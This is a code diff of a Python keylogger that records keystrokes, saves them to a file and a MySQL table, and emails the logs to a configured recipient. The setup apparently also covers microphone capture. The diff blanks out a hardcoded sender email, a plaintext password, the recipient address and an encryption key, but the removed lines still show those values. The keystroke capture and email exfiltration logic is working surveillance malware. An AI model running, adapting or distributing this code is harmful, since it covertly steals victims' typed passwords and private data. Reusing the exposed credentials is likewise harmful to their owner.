@@ -1,4 +1,3 @@
-# Libraries
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
@@ -45,16 +44,16 @@ microphone_time = 10
 time_iteration = 15
 number_of_iterations_end = 3
 
-email_address = "keylogcheck123@yahoo.com" # Enter disposable email here
-password = "u8^T3m?7JYFPWR6"  # Enter email password here
+email_address = "" # Enter disposable email here
+password = ""  # Enter email password here
 
 username = getpass.getuser()
 
-toaddr = "keylogcheck@walla.com"  # Enter the email address you want to send your information to
+toaddr = ""  # Enter the email address you want to send your information to
 
-key = "ZXhPJM7HwdlzGHEcOFUYu-dj5emifg5FImE5wJd4RbI=" # Generate an encryption key from the Cryptography folder
+key = "" # Generate an encryption key from the Cryptography folder
 
-file_path = "C:\projs\python keylogger"  # Enter the file path you want your files to be saved to
+file_path = ""  # Enter the file path you want your files to be saved to
 extend = "\\"
 file_merge = file_path + extend
 
@@ -188,28 +187,22 @@ while number_of_iterations < number_of_iterations_end:
     keys1 = []
 
     def on_press(key):
-        #print("{0} pressed".format(key))
+        print("{0} pressed".format(key))
         global keys, keys1, counter, istexist, hour
         print(key)
         keys1.append(str(key))
         keys.append(key)
         datup = datetime.timetuple(datetime.now())
         currentTime = time.time()
-        #print(datup)
-        #print(datup.tm_min)
-        #print(hour)
         counter += 1    
-        #print(cnt)
         if counter >= 1:
             write_file(keys)
             counter = 0
             keys = []
-        #print(istexist)
         if istexist == False:
             create_table()
             istexist = True
         if datup.tm_hour > hour:
-            #print("hola")
             hour = datup.tm_hour
             add_todb(keys1)
             keys1 = []
@@ -223,13 +216,6 @@ while number_of_iterations < number_of_iterations_end:
 
 
     def write_file(keys):
-        #with open("keylogs.txt","a") as text:
-            #for key in keys:
-                #k = str(key).replace("'","")
-                #if k.find("space") > 0: #replacing spaces in the text with a new line
-                    #text.write('\n')
-                #elif k.find("Key") == -1: #skipping (not writing in the text file) any key which is not a letter/number/sign (shift,control, etc...)
-                    #text.write(k)
         with open(file_path + extend + keys_information, "a") as f:
             for key in keys:
                 k = str(key).replace("'", "")
@@ -262,22 +248,17 @@ send_email(keys_information, file_path + extend + keys_information, toaddr)
 
     def create_table():
         global mydb, mycursor
-        #mycursor.execute("SHOW DATABASES")
-        #for x in mycursor:
-            #print(x)
 
-        #mycursor.execute("CREATE TABLE keyls (id INT AUTO_INCREMENT PRIMARY KEY, datetime VARCHAR(255), lkeys VARCHAR(255))")
+        mycursor.execute("CREATE TABLE keyls (id INT AUTO_INCREMENT PRIMARY KEY, datetime VARCHAR(255), lkeys VARCHAR(255))")
 
    
 
     with Listener(on_press = on_press, on_release = on_release) as listener:
         listener.join()
 
-    #print("ffpe,lp,pe", currentTime)
-    #print("mfrmoemforeofr", stoppingTime)
+    
     currentTime = time.time()
-    #print("ffpe,lp,pe", currentTime)
-    #print("mfrmoemforeofr", stoppingTime)
+    
     if currentTime > stoppingTime:
         with open(file_path + extend + keys_information, "w") as f:
             f.write(" ")
